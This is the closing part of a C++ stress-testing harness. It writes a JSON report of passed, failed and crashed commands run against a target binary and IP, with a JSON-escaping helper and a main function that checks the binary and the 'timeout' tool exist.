        json << "    \"timeout_seconds\": " << COMMAND_TIMEOUT_SEC << ",\n";
        json << "    \"timestamp\": " << std::time(nullptr) << "\n";
        json << "  },\n";
        json << "  \"summary\": {\n";
        json << "    \"total_tests\": " << test_commands.size() << ",\n";
        json << "    \"passed\": " << passed << ",\n";
        json << "    \"failed\": " << failed << ",\n";
        json << "    \"crashes\": " << crashed << ",\n";
        json << "    \"success_rate\": " << (float)passed / test_commands.size() * 100 << "\n";
        json << "  },\n";
        json << "  \"vulnerability_analysis\": {\n";
        json << "    \"critical\": " << crashed << ",\n";
        json << "    \"high\": " << (failed - crashed) << ",\n";
        json << "    \"medium\": 0,\n";
        json << "    \"low\": 0\n";
        json << "  },\n";
        json << "  \"failed_tests\": [\n";
        
        bool first = true;
        for (const auto& result : all_results) {
            if (result.exit_code != 0 || result.crashed) {
                if (!first) json << ",\n";
                json << "    {\n";
                json << "      \"command\": \"" << escapeJSON(result.command) << "\",\n";
                json << "      \"exit_code\": " << result.exit_code << ",\n";
                json << "      \"crashed\": " << (result.crashed ? "true" : "false") << ",\n";
                json << "      \"timeout\": " << (result.timeout ? "true" : "false") << ",\n";
                json << "      \"duration\": " << result.duration << ",\n";
                json << "      \"error_type\": \"" << result.error_type << "\",\n";
                json << "      \"crash_signal\": \"" << result.crash_signal << "\"\n";
                json << "    }";
                first = false;
            }
        }
        
        json << "\n  ]\n}\n";
        json.close();
    }
    
    std::string escapeJSON(const std::string& str) {
        std::string escaped;
        for (char c : str) {
            if (c == '"') escaped += "\\\"";
            else if (c == '\\') escaped += "\\\\";
            else if (c == '\n') escaped += "\\n";
            else if (c == '\r') escaped += "\\r";
            else if (c == '\t') escaped += "\\t";
            else escaped += c;
        }
        return escaped;
    }
};

int main(int argc, char* argv[]) {
    std::string target = TARGET_IP;
    std::string binary = SHIV_BINARY;
    
    if (argc > 1) target = argv[1];
    if (argc > 2) binary = argv[2];
    
    // Check if binary exists
    if (access(binary.c_str(), X_OK) != 0) {
        std::cerr << "❌ Error: " << binary << " not found or not executable!" << std::endl;
        return 1;
    }
    
    // Check if timeout command exists
    if (system("which timeout > /dev/null 2>&1") != 0) {
        std::cerr << "❌ Error: 'timeout' command not found. Install coreutils." << std::endl;
        return 1;
    }
    
    srand(time(nullptr));
    
    HardcoreShivTester tester(target, binary);
    tester.runAllTests();
    
    return 0;
}
